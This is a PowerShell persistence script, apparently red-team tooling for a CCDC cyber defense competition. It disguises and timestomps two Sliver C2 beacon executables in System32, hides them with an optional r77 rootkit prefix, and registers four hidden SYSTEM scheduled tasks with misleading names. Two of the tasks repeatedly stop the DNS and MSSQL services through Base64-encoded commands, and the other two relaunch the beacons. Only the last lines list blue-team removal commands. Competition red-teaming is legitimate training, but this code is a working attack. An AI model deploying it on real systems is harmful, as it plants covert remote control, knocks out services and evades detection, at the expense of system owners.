# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Persistence: Clockwork Chaos
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
#               T1489     (Service Stop — DNS, MSSQL)
#               T1036.003 (Masquerading: Rename System Utilities)
#               T1070.006 (Indicator Removal: Timestomp)
#
# Targets:      Windows Server 2019, Server 2022 (DNS + MSSQL roles)
# Privilege:    Administrator or SYSTEM required
# Standalone:   YES — do NOT add to CCDC_Windows_P3_COMBINED.ps1
#
# Description:
#   Takes two operator-supplied Sliver C2 beacon EXEs, stages them in
#   System32 under disguised names, and registers 4 scheduled tasks:
#
#     TASK 1 — DnsClientCacheCleanup    (every 3 min, SYSTEM)
#              Stops the Windows DNS Server service (T1489)
#
#     TASK 2 — SqlServerHealthMonitor   (every 3 min, SYSTEM, +15 s stagger)
#              Stops MSSQLSERVER + disables SQLBrowser (T1489)
#
#     TASK 3 — WindowsUpdateWorker      (every 10 min, SYSTEM, +30 s stagger)
#              Executes staged Sliver beacon 1 (T1053.005)
#
#     TASK 4 — WmiPerfCounterSync       (every 10 min, SYSTEM, +45 s stagger)
#              Executes staged Sliver beacon 2 (T1053.005)
#
#   Beacons are copied to System32 under normal-sounding names, timestomped
#   to match ntdll.dll, set Hidden+System, and ACL-locked to SYSTEM-only.
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator
#Requires -Version 5.1

param(
    [Parameter(Mandatory = $true)]
    [string]$BeaconPath1,

    [Parameter(Mandatory = $true)]
    [string]$BeaconPath2
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Persistence: Clockwork Chaos"
Write-Warn "================================================================"
Write-Host ""

# ── r77 rootkit mode ──────────────────────────────────────────────────────────
$r77Answer  = Read-Host "Is the r77 rootkit active? Prefix dropped files with `$77 to hide them? (y/N)"
$HidePrefix = ''
if ($r77Answer -match '^[Yy]') { $HidePrefix = '$77' }
if ($HidePrefix) {
    Write-Warn "r77 mode ENABLED — dropped files will be prefixed: $HidePrefix"
} else {
    Write-Info "r77 mode: disabled"
}

# ── 0. Input validation ──────────────────────────────────────────────────────
Write-Section "Input Validation"

if (-not (Test-Path $BeaconPath1 -PathType Leaf)) {
    Write-Err "BeaconPath1 not found: $BeaconPath1"
    exit 1
}
if (-not (Test-Path $BeaconPath2 -PathType Leaf)) {
    Write-Err "BeaconPath2 not found: $BeaconPath2"
    exit 1
}

$BeaconPath1 = (Resolve-Path $BeaconPath1).Path
$BeaconPath2 = (Resolve-Path $BeaconPath2).Path

Write-Info "Beacon 1 : $BeaconPath1  ($([Math]::Round((Get-Item $BeaconPath1).Length/1KB,1)) KB)"
Write-Info "Beacon 2 : $BeaconPath2  ($([Math]::Round((Get-Item $BeaconPath2).Length/1KB,1)) KB)"

# ── 1. Reference timestamp (ntdll.dll → kernel32 → user32 → hardcoded) ──────
Write-Section "Reference Timestamp"

$script:RefTime = $null
foreach ($candidate in @(
    "$env:SystemRoot\System32\ntdll.dll",
    "$env:SystemRoot\System32\kernel32.dll",
    "$env:SystemRoot\System32\user32.dll"
)) {
    if (Test-Path $candidate) {
        $script:RefTime = (Get-Item $candidate -Force).LastWriteTime
        Write-Success "Reference timestamp: $($script:RefTime)  (from $(Split-Path $candidate -Leaf))"
        break
    }
}
if ($null -eq $script:RefTime) {
    $script:RefTime = [datetime]"2019-03-19 03:44:22"
    Write-Warn "Using fallback timestamp: $($script:RefTime)"
}

# ── 2. Helpers ────────────────────────────────────────────────────────────────
function Invoke-Timestomp {
    param([string]$Path)
    if (-not (Test-Path $Path -PathType Leaf)) { return }
    try {
        [System.IO.File]::SetCreationTime($Path,   $script:RefTime)
        [System.IO.File]::SetLastWriteTime($Path,  $script:RefTime)
        [System.IO.File]::SetLastAccessTime($Path, $script:RefTime)
    } catch { Write-Warn "  Timestomp failed [$Path]: $_" }
}

function Set-StealthAttributes {
    param([string]$Path)
    try {
        $item = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
        $item.Attributes = $item.Attributes -bor
            [System.IO.FileAttributes]::Hidden -bor
            [System.IO.FileAttributes]::System
    } catch { Write-Warn "  StealthAttrib failed [$Path]: $_" }
}

# ── 3. Binary staging ─────────────────────────────────────────────────────────
Write-Section "Binary Staging  (T1036.003 + T1070.006)"

$NamePool = @(
    "taskhostw_mon.exe",
    "wermgr_svc.exe",
    "lsaiso_helper.exe",
    "svchost_wmi.exe",
    "csrss_mon.exe",
    "dwm_helper.exe"
)

$MaskedName1 = $HidePrefix + $NamePool[0]
$MaskedName2 = $HidePrefix + $NamePool[1]
$StagedPath1 = "$env:SystemRoot\System32\$MaskedName1"
$StagedPath2 = "$env:SystemRoot\System32\$MaskedName2"

foreach ($pair in @(
    @{ Src = $BeaconPath1; Dst = $StagedPath1; Label = "Beacon 1" },
    @{ Src = $BeaconPath2; Dst = $StagedPath2; Label = "Beacon 2" }
)) {
    Write-Info "Staging $($pair.Label): $($pair.Src) → $($pair.Dst)"
    try {
        Copy-Item -Path $pair.Src -Destination $pair.Dst -Force -ErrorAction Stop
        Set-StealthAttributes -Path $pair.Dst
        Invoke-Timestomp      -Path $pair.Dst

        # ACL: SYSTEM full control, deny Users RX
        $null = icacls.exe $pair.Dst /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1
        $null = icacls.exe $pair.Dst /deny "BUILTIN\Users:(RX)" 2>&1

        Write-Success "  Staged   : $($pair.Dst)"
        Write-Success "  Timestamp: $($script:RefTime)"
    } catch {
        Write-Err "  Staging failed for $($pair.Label): $_"
    }
}

# ── 4. Service-killer payloads (Base64-encoded PS commands) ───────────────────
Write-Section "Building Service-Killer Payloads  (T1489)"

$DnsScript = @'
$s = Get-Service -Name DNS -ErrorAction SilentlyContinue
if ($s -and $s.Status -eq 'Running') { Stop-Service -Name DNS -Force -ErrorAction SilentlyContinue }
'@
$DnsEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DnsScript))
Write-Success "DNS stop payload encoded"

$SqlScript = @'
$s = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
if ($s) { Stop-Service -Name SQLBrowser -Force -ErrorAction SilentlyContinue; Set-Service -Name SQLBrowser -StartupType Disabled -ErrorAction SilentlyContinue }
$s2 = Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue
if ($s2 -and $s2.Status -eq 'Running') { Stop-Service -Name MSSQLSERVER -Force -ErrorAction SilentlyContinue }
'@
$SqlEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($SqlScript))
Write-Success "MSSQL stop payload encoded"

# ── 5. Common task components ─────────────────────────────────────────────────
$CommonSettings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -ExecutionTimeLimit     (New-TimeSpan -Hours 0) `
    -RestartCount           3 `
    -RestartInterval        (New-TimeSpan -Minutes 1) `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable:$false

$SystemPrincipal = New-ScheduledTaskPrincipal `
    -UserId    "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel  Highest

# ── 6. Register all 4 scheduled tasks ────────────────────────────────────────
Write-Section "Registering Scheduled Tasks  (T1053.005)"

# -- Task 1: DnsClientCacheCleanup — stops DNS every 3 minutes ----------------
$T1Name = "DnsClientCacheCleanup"
$T1Desc = "Windows DNS client cache maintenance (system managed)"

Write-Info "Registering $T1Name ..."
try {
    Unregister-ScheduledTask -TaskName $T1Name -Confirm:$false -ErrorAction SilentlyContinue

    $t1Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $DnsEncoded"

    $t1Trigger = New-ScheduledTaskTrigger `
        -RepetitionInterval  (New-TimeSpan -Minutes 3) `
        -RepetitionDuration  (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(10)

    Register-ScheduledTask `
        -TaskName    $T1Name `
        -Action      $t1Action `
        -Trigger     $t1Trigger `
        -Settings    $CommonSettings `
        -Principal   $SystemPrincipal `
        -Description $T1Desc `
        -Force | Out-Null

    Write-Success "$T1Name registered  (every 3 min, SYSTEM, hidden)"
} catch {
    Write-Err "Failed to register ${T1Name}: $_"
}

# -- Task 2: SqlServerHealthMonitor — stops MSSQL every 3 minutes -------------
$T2Name = "SqlServerHealthMonitor"
$T2Desc = "SQL Server telemetry and health diagnostics (system managed)"

Write-Info "Registering $T2Name ..."
try {
    Unregister-ScheduledTask -TaskName $T2Name -Confirm:$false -ErrorAction SilentlyContinue

    $t2Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $SqlEncoded"

    $t2Trigger = New-ScheduledTaskTrigger `
        -RepetitionInterval  (New-TimeSpan -Minutes 3) `
        -RepetitionDuration  (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(25)

    Register-ScheduledTask `
        -TaskName    $T2Name `
        -Action      $t2Action `
        -Trigger     $t2Trigger `
        -Settings    $CommonSettings `
        -Principal   $SystemPrincipal `
        -Description $T2Desc `
        -Force | Out-Null

    Write-Success "$T2Name registered  (every 3 min, +15 s stagger, SYSTEM, hidden)"
} catch {
    Write-Err "Failed to register ${T2Name}: $_"
}

# -- Task 3: WindowsUpdateWorker — runs beacon 1 every 10 minutes -------------
$T3Name = "WindowsUpdateWorker"
$T3Desc = "Windows Update background worker (system managed)"

Write-Info "Registering $T3Name ..."
try {
    Unregister-ScheduledTask -TaskName $T3Name -Confirm:$false -ErrorAction SilentlyContinue

    $t3Action  = New-ScheduledTaskAction -Execute $StagedPath1

    $t3Trigger = New-ScheduledTaskTrigger `
        -RepetitionInterval  (New-TimeSpan -Minutes 10) `
        -RepetitionDuration  (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(40)

    Register-ScheduledTask `
        -TaskName    $T3Name `
        -Action      $t3Action `
        -Trigger     $t3Trigger `
        -Settings    $CommonSettings `
        -Principal   $SystemPrincipal `
        -Description $T3Desc `
        -Force | Out-Null

    Write-Success "$T3Name registered  (every 10 min, +30 s stagger, SYSTEM, hidden)"
    Write-Success "  Executes : $StagedPath1"
} catch {
    Write-Err "Failed to register ${T3Name}: $_"
}

# -- Task 4: WmiPerfCounterSync — runs beacon 2 every 10 minutes --------------
$T4Name = "WmiPerfCounterSync"
$T4Desc = "WMI performance counter synchronisation service (system managed)"

Write-Info "Registering $T4Name ..."
try {
    Unregister-ScheduledTask -TaskName $T4Name -Confirm:$false -ErrorAction SilentlyContinue

    $t4Action  = New-ScheduledTaskAction -Execute $StagedPath2

    $t4Trigger = New-ScheduledTaskTrigger `
        -RepetitionInterval  (New-TimeSpan -Minutes 10) `
        -RepetitionDuration  (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(55)

    Register-ScheduledTask `
        -TaskName    $T4Name `
        -Action      $t4Action `
        -Trigger     $t4Trigger `
        -Settings    $CommonSettings `
        -Principal   $SystemPrincipal `
        -Description $T4Desc `
        -Force | Out-Null

    Write-Success "$T4Name registered  (every 10 min, +45 s stagger, SYSTEM, hidden)"
    Write-Success "  Executes : $StagedPath2"
} catch {
    Write-Err "Failed to register ${T4Name}: $_"
}

# ── 7. Final summary ──────────────────────────────────────────────────────────
Write-Section "Summary"

Write-Info "Scheduled tasks registered:"
Write-Info "  [$T1Name]     every  3 min  — Stop-Service DNS"
Write-Info "  [$T2Name]  every  3 min  — Stop-Service MSSQLSERVER + SQLBrowser"
Write-Info "  [$T3Name]       every 10 min  — $StagedPath1"
Write-Info "  [$T4Name]        every 10 min  — $StagedPath2"
Write-Host ""
Write-Info "Staged binaries:"
Write-Info "  $StagedPath1  (Hidden+System, timestomped, SYSTEM-ACL)"
Write-Info "  $StagedPath2  (Hidden+System, timestomped, SYSTEM-ACL)"
Write-Host ""
Write-Info "MITRE ATT&CK:"
Write-Info "  T1053.005 — Scheduled Task/Job: Scheduled Task"
Write-Info "  T1489     — Service Stop"
Write-Info "  T1036.003 — Masquerading: Rename System Utilities"
Write-Info "  T1070.006 — Indicator Removal: Timestomp"
Write-Host ""
Write-Warn "Blue-team remediation:"
Write-Warn "  Unregister-ScheduledTask -TaskName $T1Name -Confirm:`$false"
Write-Warn "  Unregister-ScheduledTask -TaskName $T2Name -Confirm:`$false"
Write-Warn "  Unregister-ScheduledTask -TaskName $T3Name -Confirm:`$false"
Write-Warn "  Unregister-ScheduledTask -TaskName $T4Name -Confirm:`$false"
Write-Warn "  icacls `"$StagedPath1`" /reset; Remove-Item `"$StagedPath1`" -Force"
Write-Warn "  icacls `"$StagedPath2`" /reset; Remove-Item `"$StagedPath2`" -Force"
Write-Host ""
